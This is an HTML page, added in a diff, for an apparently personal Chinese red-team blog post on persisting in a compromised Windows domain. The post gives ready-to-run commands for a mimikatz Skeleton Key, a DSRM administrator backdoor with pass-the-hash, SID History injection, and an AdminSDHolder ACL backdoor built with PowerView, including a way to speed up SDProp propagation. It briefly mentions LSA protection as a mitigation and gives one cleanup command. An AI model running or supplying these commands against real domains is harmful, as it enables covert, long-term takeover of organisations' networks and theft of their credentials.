@@ -1,0 +1,665 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="拿到域控后，需要一些技术来保持权限维持，接下来介绍常见的域控技术。 1：创建Skeleton域后门安装Skeleton Key后，所有域账户都可以使用一个相同的密码进行认证，同时原有密码仍然有效。该技术通过注入lsass。exe进程实现，创建的Skeleton Key保存在内存中，如果域控重启，那么其将会失效。 利用条件：域管理员 利用工具：mimikatz。 mimikatz.exeprivil">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限维持-域后门">
+<meta property="og:url" content="http://example.com/2024/01/19/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%9F%9F%E5%90%8E%E9%97%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="拿到域控后，需要一些技术来保持权限维持，接下来介绍常见的域控技术。 1：创建Skeleton域后门安装Skeleton Key后，所有域账户都可以使用一个相同的密码进行认证，同时原有密码仍然有效。该技术通过注入lsass。exe进程实现，创建的Skeleton Key保存在内存中，如果域控重启，那么其将会失效。 利用条件：域管理员 利用工具：mimikatz。 mimikatz.exeprivil">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/persistence2/D08C1952C7A5415AB01A25FFD2ACFEB1.png">
+<meta property="og:image" content="http://example.com/persistence2/12552693C0FB41C395C8953E6ABE0DBE.png">
+<meta property="og:image" content="http://example.com/persistence2/7DE0B2FB79A64F57A0247666F400A286.png">
+<meta property="og:image" content="http://example.com/persistence2/CC78F93324944541A4E94A15482D5AC6.jpg">
+<meta property="og:image" content="http://example.com/persistence2/F22A44B9CA074887A523976F6DD3E7D9.jpg">
+<meta property="og:image" content="http://example.com/persistence2/FE2FF8B6BF834521A4E8D90AA2516010.jpg">
+<meta property="article:published_time" content="2024-01-19T13:40:13.000Z">
+<meta property="article:modified_time" content="2024-01-19T13:56:06.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Red Team">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/persistence2/D08C1952C7A5415AB01A25FFD2ACFEB1.png">
+  
+  
+  
+  <title>权限维持-域后门 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="权限维持-域后门"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-19 21:40" pubdate>
+          January 19, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">权限维持-域后门</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>拿到域控后，需要一些技术来保持权限维持，接下来介绍常见的域控技术。</p>
+<h1 id="1：创建Skeleton域后门"><a href="#1：创建Skeleton域后门" class="headerlink" title="1：创建Skeleton域后门"></a>1：创建Skeleton域后门</h1><p>安装Skeleton Key后，所有域账户都可以使用一个相同的密码进行认证，同时原有密码仍然有效。<br>该技术通过注入lsass。exe进程实现，创建的Skeleton Key保存在内存中，如果域控重启，那么其<br>将会失效。</p>
+<p>利用条件：域管理员</p>
+<p>利用工具：mimikatz。</p>
+<p>mimikatz.exe<br>privilege::debug<br>misc::skeleton<br>exit</p>
+<p>这样所有的域账户有一个相同的密码mimikatz。</p>
+<p>缓解措施：<br>微软在 2014 年 3 月添加了 LSA（Local Security Authority，本地安全机构）保护策略，用来防止对 lsass.exe 进程的内存读取和代码注入。通过执行以下命令，可以开启或关闭 LSA 保护。</p>
+<p># 开启 LSA 保护策略<br>reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa” &#x2F;v RunAsPPL &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br># 关闭 LSA 保护策略<br>reg delete “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa” &#x2F;v RunAsPPL<br>开启LSA 保护策略并重启系统后，Mimikatz 的相关操作都会失败。此时即使已经获取了 Debug 权限也无法读取用户哈希值，更无法安装 Skeleton Key。</p>
+<h1 id="2：创建DSRM域后门"><a href="#2：创建DSRM域后门" class="headerlink" title="2：创建DSRM域后门"></a>2：创建DSRM域后门</h1><p>DSRM（Directory Services Restore Mode，目录服务还原模式）是域控的安全模式启动选项，用于使服务器脱机，以进行紧急维护。在初期安装 Windows 域服务时，安装向导会提示用户设置 DSRM 的管理员密码。有了该密码后，网络管理员可以在后期域控发生问题时修复、还原或重建活动目录数据库。<br>在域控上，DSRM 账户实际上就是本地管理员账户（Administrator），并且该账户的密码在创建后几乎很少使用。通过在域控上运行 NTDSUtil，可以为 DSRM 账户修改密码，相关命令如下：</p>
+<p>*其实就是一个账户。</p>
+<p>利用条件：<br>windows server 2008之后，并且拥有域管。</p>
+<p>通过mimikatz读取域控SAM文件，获取DSRM账户的哈希值<br>mimikatz.exe “privilege::debug” “token::elevate” “lsadump::sam” exit</p>
+<p><img src="/../persistence2/D08C1952C7A5415AB01A25FFD2ACFEB1.png" srcset="/img/loading.gif" lazyload alt="img"><br>c013ad5754c693dde42e6f2802c8ae4</p>
+<p>改 DSRM 账户的登录模式，以允许该账户远程登录。可以通过编辑注册表的DsrmAdminLogonBehavior 键值来实现，可选用的登录模式有以下3种：<br>0：默认值，只有当域控制器重启并进入 DSRM 模式时，才可以使用 DSRM 管理员账号。<br>1：只有当本地 AD DS 服务停止时，才可以使用 DSRM 管理员账号登录域控制器。<br>2：在任何情况下，都可以使用 DSRM 管理员账号登录域控制器。<br>必然是修改为2：<br>reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa” &#x2F;v DsrmAdminLogonBehavior &#x2F;t REG_DWORD &#x2F;d 2 &#x2F;f</p>
+<p>完事后可以应用到任意的NTLM哈希传递攻击。<br>如mimikatz：<br>sekurlsa::pth &#x2F;user:administrator &#x2F;domain:zhattatey &#x2F;ntlm:c013ad5754c693dde42e6f2802c8ae4d</p>
+<p>或者psexec：<br>.&#x2F;psexec.py zhattatey&#x2F;Administrator@ip -hashes :xxx</p>
+<h1 id="3：SID-History的利用：1-SID-SID-History"><a href="#3：SID-History的利用：1-SID-SID-History" class="headerlink" title="3：SID History的利用：1. SID &amp; SID History"></a>3：SID History的利用：1. SID &amp; SID History</h1><p>在 Windows 系统中，SID（Security Identifiers）是指安全标识符，是用户、用户组或其他安全主体的唯一、不可变标识符。<br>Windows 根据 ACL（访问控制列表）授予或拒绝对资源的访问和特权，ACL 使用 SID 来唯一标识用户及其组成员身份。当用户登录到计算机时，会生成一个访问令牌，其中包含用户和组 SID 和用户权限级别。当用户请求访问资源时，将根据 ACL 检查访问令牌以允许或拒绝对特定对象的特定操作。<br>如果将账户删除，然后使用相同的名字创建另一个账户，那么新账户不会具有前一个账户的特权或访问权限，这是因为两个账户的 SID 不同。<br>SID History 是一个支持域迁移方案的属性，使得一个账户的访问权限可以有效地克隆到另一个账户，这在域迁移过程中非常有用。例如，当 Domain A 中的用户迁移到 Domain B 时，会在 Domain B 中新创建一个账号。此时，将 Domain A 用户的 SID 添加到 Domain B 的用户账户的 SID History 属性中。这就确保了 Domain B 用户仍然拥有访问 Domain A 中资源的权限。</p>
+<p>SID：牌子，ACL：列表。访问时，把列表和牌子对照。</p>
+<p>在实战中，hacker 可以将域管理员用户的 SID 添加到其他域用户的 SID History 属性中，以此建立一个隐蔽的域后门。</p>
+<p>利用条件：域管</p>
+<p>例：将Administrator的SID添加进Alice的SID History<br># mimikatz版本大于2.1.0<br>mimikatz.exe “privilege::debug” “sid::patch” “sid::add &#x2F;sam:Alice &#x2F;new:Administrator” exit<br># mimikatz版本小于2.1.0<br>mimikatz.exe “privilege::debug” “misc::addsid Alice ADSAdministrator” exit</p>
+<p>*通过powershell查看Alice：<br>Import-Module ActiveDirectory<br>Get-ADUser hack -Properties SIDHistory</p>
+<p><img src="/../persistence2/12552693C0FB41C395C8953E6ABE0DBE.png" srcset="/img/loading.gif" lazyload alt="img"><br>一毛一样。</p>
+<p>如果用Alice连接域控，执行whoami &#x2F;priv将看到拥有域管所有权限。</p>
+<h1 id="4：利用AdminSDHolder打造域后门"><a href="#4：利用AdminSDHolder打造域后门" class="headerlink" title="4：利用AdminSDHolder打造域后门"></a>4：利用AdminSDHolder打造域后门</h1><p>AdminSDHolder 是一个特殊的 Active Directory 容器对象，位于 Domain NC 的 System 容器下。</p>
+<p><img src="/../persistence2/7DE0B2FB79A64F57A0247666F400A286.png" srcset="/img/loading.gif" lazyload alt="img"><br>AdminSDHolder 通常作为系统中某些受保护对象的安全模板，以防止这些对象遭受恶意修改或滥用。<br>受保护对象通常包括系统的特权用户和重要的组，如 Administrator、Domain Admins、Enterprise Admins 以及 Schema Admins 等。<br>在活动目录中，属性 adminCount 用来标记特权用户和组。对于特权用户和组来说，该属性值被设为 1。<br>通过 ADFind 查询 adminCount 属性设置为 1 的对象，可以找到所有受 AdminSDHolder 保护的特权用户和组。</p>
+<p># 枚举受保护的用户<br>Adfind.exe -b “dc&#x3D;hack-my,dc&#x3D;com” -f “&amp;(objectcategory&#x3D;person)(samaccountname&#x3D;*)(admincount&#x3D;1)” -dn<br># 枚举受保护的组<br>Adfind.exe -b “dc&#x3D;hack-my,dc&#x3D;com” -f “&amp;(objectcategory&#x3D;group)(admincount&#x3D;1)” -dn<br>在默认情况下，系统将定期（每60分钟)检查受保护对象的安全描述符，将受保护对象的 ACL 与 AdminSDHolder 容器的 ACL 进行比较，如果二者不一致，系统就会将受保护对象的 ACL 强制修改为 AdminSDHolder 容器的 ACL。该工作通过 SDProp 进程来完成，该进程以 60 分钟为一个工作周期</p>
+<p>在实战中，hacker 可以篡改 AdminSDHolder 容器的 ACL 配置。当系统调用 SDProp 进程执行相关工作时，被篡改的 ACL 配置将同步到受保护的 ACL 中，以此建立一个隐蔽的域后门。</p>
+<p>利用条件：域管</p>
+<p>执行以下命令，通过 PowerView 向 AdminSDHolder 容器对象添加一个 ACL，使普通域用户 Alice 拥有对 AdminSDHolder 的 “完全控制” 权限。<br>Import-Module .\PowerView.ps1<br>Add-DomainObjectAcl -TargetSearchBase “LDAP:&#x2F;&#x2F;CN&#x3D;AdminSDHolder,CN&#x3D;System,DC&#x3D;hack-my,DC&#x3D;com” -PrincipalIdentity Alice -Rights All -Verbose<br>执行后，Alice 用户成功拥有 AdminSDHolder 容器对象的完全控制权限<br>等待 60 分钟后，Alice 用户将获得对系统中的特权用户和组完全控制权限。</p>
+<p>清除:<br>Remove-DomainObjectAcl -TargetSearchBase “LDAP:&#x2F;&#x2F;CN&#x3D;AdminSDHolder,CN&#x3D;System,DC&#x3D;hack-my,DC&#x3D;com” -PrincipalIdentity Alice -Rights All -Verbose</p>
+<h3 id="缩短SDDrop工作周期："><a href="#缩短SDDrop工作周期：" class="headerlink" title="缩短SDDrop工作周期："></a>缩短SDDrop工作周期：</h3><p>方法1：修改注册表<br>hacker 也可以通过注册表手动修改 SDProp 进程的工作周期，以缩短等待的时长（最小值1分钟，最大值2小时）。该注册表需要慎重修改， 当修改的频率变高时，CPU处理LSASS的开销也就越大，这很容易导致系统变得卡顿，该注册表键默认是不存在的。<br># 工作周期修改为 1 分钟，键值以秒为单位<br>reg add HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters\AdminSDProtectFrequency &#x2F;t REG_DWORD &#x2F;d 60<br><img src="/../persistence2/CC78F93324944541A4E94A15482D5AC6.jpg" srcset="/img/loading.gif" lazyload alt="img"><br>方法2：强制 SDProp 执行<br>① 运行 Ldp.exe（C:\Windows\System32\Ldp.exe）<br>② 点击连接 -&gt; 连接，输入当前机器的机器名或IP，端口默认为 389<br>③ 点击连接 -&gt; 绑定，选择绑定为当前登录的用户<br>④ 在修改窗口这里针对不同版本的域控制器有不同的情况：<br>当域控为Windows Server 2008时，点击浏览 -&gt; 修改，在属性选项卡中输入 FixUpInheritance ，在值字段输入 yes。操作选择添加，然后点击输入，最后运行即可。<br><img src="/../persistence2/F22A44B9CA074887A523976F6DD3E7D9.jpg" srcset="/img/loading.gif" lazyload alt="img"><br>当域控为Windows Server 2008 R2或Windows Server 2012及以上时，点击浏览 -&gt; 修改，在属性选项卡中输入 RunProtectAdminGroupsTask ，在值字段输入 1。操作选择添加，然后点击输入，最后运行即可。<br><img src="/../persistence2/FE2FF8B6BF834521A4E8D90AA2516010.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h1 id="5：通过HOOK-PasswordChangeNotify"><a href="#5：通过HOOK-PasswordChangeNotify" class="headerlink" title="5：通过HOOK PasswordChangeNotify"></a>5：通过HOOK PasswordChangeNotify</h1><p>PasswordChangeNotify 在微软官方文档中的名称为 PsamPasswordNotificationRoutine，是一个 Windows API。当用户重置密码时，Windows 会先检查新密码是否符合复杂性要求，如果密码符合要求，LSA 会调用 PasswordChangeNotify 函数在系统中同步密码。<br>当调用 PasswordChangeNotify 时，用户名和密码将以明文的形式传入。hacker 可以通过 Hook 技术，劫持 PasswordChangeNotify 函数的执行流程，从而获取传入的明文密码。</p>
+<p>没复现。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Red-Team/" class="print-no-link">#Red Team</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>权限维持-域后门</div>
+      <div>http://example.com/2024/01/19/权限维持-域后门/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>January 19, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/01/30/Apache-OFbiz-groovy-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/19/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8/" title="权限维持-系统后门">
+                        <span class="hidden-mobile">权限维持-系统后门</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
